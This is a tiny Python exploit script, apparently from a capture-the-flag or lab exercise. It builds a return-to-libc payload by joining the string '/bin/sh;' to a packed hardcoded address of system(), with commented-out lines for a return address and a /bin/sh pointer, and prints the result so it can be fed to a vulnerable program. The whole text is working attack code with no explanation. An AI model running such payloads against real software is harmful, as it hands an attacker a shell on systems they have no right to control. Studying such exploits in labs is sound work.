import struct
padding = '/bin/sh;'  # 'A' * 8
system = struct.pack('I', 0xf7e4c850)
# return_after_system = 'AAAA'
# bin_sh = struct.pack('I', 0xf7f6ecc8)
print(padding + system)  # + return_after_system + bin_sh)
